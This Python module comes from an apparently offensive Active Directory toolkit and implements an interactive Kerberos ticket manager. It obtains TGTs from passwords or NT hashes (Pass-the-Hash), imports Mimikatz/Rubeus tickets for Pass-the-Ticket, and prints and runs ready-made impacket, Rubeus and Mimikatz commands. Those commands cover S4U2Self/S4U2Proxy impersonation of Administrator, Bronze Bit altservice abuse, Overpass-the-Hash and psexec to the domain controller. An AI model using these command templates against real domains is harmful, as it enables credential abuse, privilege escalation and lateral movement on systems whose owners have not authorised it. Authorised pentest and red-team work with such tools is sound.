"""
Module: Kerberos Ticket Manager
Techniques: TGT request (pass/hash), ticket import (.kirbi/.ccache),
            Pass-the-Ticket, S4U2Self/S4U2Proxy, ticket renewal,
            ccache management, krb5.conf generator
"""
from utils.helpers import *

# imp() is imported from utils.helpers (via *) — uses system python3, bypasses venv
from config.settings import (
    SESSION, krb5_request_tgt, krb5_load_ticket,
    krb5_inject_ticket, krb5_list_tickets,
    krb5_destroy, krb5_renew, get_auth_mode,
    update_session
)
import os

def run():
    print_banner("KERBEROS TICKET MANAGER", "TGT / PTT / S4U / ccache management")

    dc   = input_or_session("dc_ip",   "DC IP")
    dom  = input_or_session("domain",  "Domain")
    user = input_or_session("username","Username")

    # Show current auth mode
    print(f"\n  {C}Current auth mode:{RST} {get_auth_mode()}")
    if SESSION.get("krb5_ccache"):
        print(f"  {C}Active ccache   :{RST} {SESSION['krb5_ccache']}")
    print()

    print(f"""
  {C}── TICKET ACQUISITION ──────────────────────────────────────{RST}
  [1]  Request TGT (password)
  [2]  Request TGT (NT hash / Pass-the-Hash)
  [3]  Load existing .ccache file
  [4]  Import .kirbi ticket (Rubeus → Linux)
  [5]  Import Base64 ticket (Rubeus output)
  {C}── TICKET MANAGEMENT ────────────────────────────────────────{RST}
  [6]  List tickets (klist)
  [7]  Renew TGT
  [8]  Destroy / clear tickets
  [9]  Switch ccache file
  {C}── ADVANCED ──────────────────────────────────────────────────{RST}
  [12] Overpass-the-Hash (NTLM → Kerberos TGT)
  [13] Generate krb5.conf for this domain
  [14] Toggle Kerberos mode ON/OFF
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    # ── [1] TGT via password ──────────────────────────────────────────────────
    if c == "1":
        pw    = input_or_session("password", "Password", secret=True)
        cache = prompt(f"Save ccache to (default=/tmp/{user}_{dom}.ccache)") or \
                f"/tmp/{user}_{dom}.ccache"
        ok = krb5_request_tgt(
            username=user, password=pw,
            domain=dom, dc_ip=dc, ccache=cache
        )
        if ok:
            from config.settings import save_session
            save_session()
            success(f"TGT active — Kerberos mode enabled")
            success(f"ccache: {cache}")
            print(f"\n  {Y}Export for manual use:{RST}")
            print(f"  export KRB5CCNAME={cache}")
        else:
            error("TGT request failed")

    # ── [2] TGT via NT hash ───────────────────────────────────────────────────
    elif c == "2":
        h = input_or_session("nt_hash", "NT Hash (LM:NT or NT only)", secret=True)
        cache = prompt(f"Save ccache to (default=/tmp/{user}_{dom}.ccache)") or \
                f"/tmp/{user}_{dom}.ccache"
        ok = krb5_request_tgt(
            username=user, nt_hash=h,
            domain=dom, dc_ip=dc, ccache=cache
        )
        if ok:
            success(f"TGT obtained via Pass-the-Hash → Kerberos mode enabled")
            print(f"  export KRB5CCNAME={cache}")
        else:
            error("TGT request failed")

    # ── [3] Load .ccache ──────────────────────────────────────────────────────
    elif c == "3":
        ccache_path = prompt("Path to .ccache file")
        if krb5_load_ticket(ccache_path):
            success("Ticket loaded — Kerberos mode enabled")
            print(f"  export KRB5CCNAME={ccache_path}")
        else:
            error("Failed to load ticket")

    # ── [4] Import .kirbi ─────────────────────────────────────────────────────
    elif c == "4":
        kirbi_path = prompt("Path to .kirbi file (from Mimikatz/Rubeus)")
        if krb5_inject_ticket(kirbi_path):
            success("kirbi ticket converted and loaded")
        else:
            error("Ticket import failed")

    # ── [5] Import Base64 ticket ──────────────────────────────────────────────
    elif c == "5":
        b64 = prompt("Paste Base64 ticket (from Rubeus /nowrap output)")
        if krb5_inject_ticket(b64.strip()):
            success("Base64 ticket converted and loaded")
        else:
            error("Ticket import failed")

    # ── [6] klist ─────────────────────────────────────────────────────────────
    elif c == "6":
        output = krb5_list_tickets()
        print(f"\n{output}")

    # ── [7] Renew TGT ─────────────────────────────────────────────────────────
    elif c == "7":
        krb5_renew()

    # ── [8] Destroy tickets ───────────────────────────────────────────────────
    elif c == "8":
        confirm = input(f"  {R}Destroy all tickets? [y/N]:{RST} ")
        if confirm.lower() == "y":
            krb5_destroy()

    # ── [9] Switch ccache ─────────────────────────────────────────────────────
    elif c == "9":
        new_cache = prompt("New ccache path")
        if krb5_load_ticket(new_cache):
            success(f"Switched to: {new_cache}")

    # ── [10] S4U2Self ─────────────────────────────────────────────────────────
    elif c == "10":
        svc_user   = prompt("Service account username")
        svc_pw     = prompt("Service account password (or blank for hash)")
        svc_hash   = prompt("Service account NT hash (or blank for password)")
        impersonate= prompt("User to impersonate (e.g. Administrator)")
        spn        = prompt("Target SPN (e.g. cifs/dc01.corp.local)")
        out_cache  = f"/tmp/s4u_{impersonate}.ccache"
        print(f"""
  {C}S4U2Self — impersonate {impersonate} via {svc_user}:{RST}

  {Y}impacket-getST:{RST}
  impacket-getST \\
    -spn {spn} \\
    -impersonate {impersonate} \\
    -self \\
    {dom}/{svc_user}:'{svc_pw}' -dc-ip {dc}

  {Y}Via Rubeus (Windows):{RST}
  .\\Rubeus.exe s4u \\
    /user:{svc_user} /rc4:{svc_hash} \\
    /impersonateuser:{impersonate} \\
    /msdsspn:{spn} /domain:{dom} \\
    /dc:{dc} /ptt /nowrap

  {Y}After impacket — use ticket:{RST}
  export KRB5CCNAME={out_cache}
  impacket-psexec {dom}/{impersonate}@{dc} -k -no-pass
""")
        run_cmd(
            f"{imp('getST.py')} -spn {spn} -impersonate {impersonate} "
            f"{dom}/{svc_user}:'{svc_pw}' -dc-ip {dc}"
        )

    # ── [11] S4U2Proxy ────────────────────────────────────────────────────────
    elif c == "11":
        svc_user   = prompt("Service account (with delegation rights)")
        svc_pw     = prompt("Service account password")
        svc_hash   = prompt("Service account NT hash (blank if using password)")
        impersonate= prompt("User to impersonate")
        target_spn = prompt("Target SPN (e.g. cifs/target.corp.local)")
        additional = prompt("Additional SPN (blank to skip)")
        print(f"""
  {C}S4U2Proxy — full constrained delegation chain:{RST}

  {Y}impacket-getST:{RST}
  impacket-getST \\
    -spn {target_spn} \\
    -impersonate {impersonate} \\
    {dom}/{svc_user}:'{svc_pw}' \\
    -dc-ip {dc}

  {Y}With altservice (Bronze Bit):{RST}
  impacket-getST \\
    -spn {target_spn} \\
    -altservice {additional or "host"} \\
    -impersonate {impersonate} \\
    {dom}/{svc_user}:'{svc_pw}' \\
    -dc-ip {dc}

  {Y}Use ticket:{RST}
  export KRB5CCNAME={impersonate}@{target_spn.replace("/","_")}.ccache
  impacket-psexec {dom}/{impersonate}@{dc} -k -no-pass
""")

    # ── [12] Overpass-the-Hash ────────────────────────────────────────────────
    elif c == "12":
        h   = input_or_session("nt_hash", "NT Hash", secret=True)
        nt  = h.split(":")[-1]
        cache = f"/tmp/opth_{user}_{dom}.ccache"
        print(f"""
  {C}Overpass-the-Hash — convert NTLM hash to Kerberos TGT:{RST}

  {Y}impacket-getTGT (Linux):{RST}
  impacket-getTGT {dom}/{user} -hashes :{nt} -dc-ip {dc}
  export KRB5CCNAME={user}.ccache

  {Y}Rubeus (Windows):{RST}
  .\\Rubeus.exe asktgt /user:{user} /rc4:{nt} /domain:{dom} /dc:{dc} /ptt /nowrap

  {Y}Mimikatz (Windows):{RST}
  sekurlsa::pth /user:{user} /domain:{dom} /ntlm:{nt} /run:powershell.exe
""")
        run_cmd(f"{imp('getTGT.py')} {dom}/{user} -hashes :{nt} -dc-ip {dc}")
        if krb5_load_ticket(f"{user}.ccache"):
            import shutil as sh
            sh.move(f"{user}.ccache", cache)
            krb5_load_ticket(cache)
            success(f"Overpass-the-Hash successful → ccache: {cache}")

    # ── [13] Generate krb5.conf ───────────────────────────────────────────────
    elif c == "13":
        dc_fqdn = SESSION.get("dc_fqdn") or prompt(f"DC FQDN (e.g. DC01.{dom})")
        realm   = dom.upper()
        conf    = f"""[libdefaults]
    default_realm = {realm}
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    noaddresses = true

[realms]
    {realm} = {{
        kdc = {dc_fqdn}
        admin_server = {dc_fqdn}
        default_domain = {dom}
    }}

[domain_realm]
    .{dom} = {realm}
    {dom} = {realm}
"""
        conf_path = f"/tmp/krb5_{dom}.conf"
        with open(conf_path, "w") as f:
            f.write(conf)
        success(f"krb5.conf written to {conf_path}")
        print(f"\n  {Y}Use with:{RST}")
        print(f"  export KRB5_CONFIG={conf_path}")
        print(f"\n{conf}")
        update_session(krb5_config=conf_path)
        os.environ["KRB5_CONFIG"] = conf_path

    # ── [14] Toggle Kerberos mode ─────────────────────────────────────────────
    elif c == "14":
        current = SESSION.get("use_kerberos", False)
        new_val = not current
        update_session(use_kerberos=new_val)
        if new_val:
            success("Kerberos mode ENABLED — all commands will use -k -no-pass")
            if SESSION.get("krb5_ccache"):
                print(f"  ccache: {SESSION['krb5_ccache']}")
            else:
                warn("No ccache set — request a TGT first (option [1] or [2])")
        else:
            warn("Kerberos mode DISABLED — reverting to password/hash auth")

    pause()
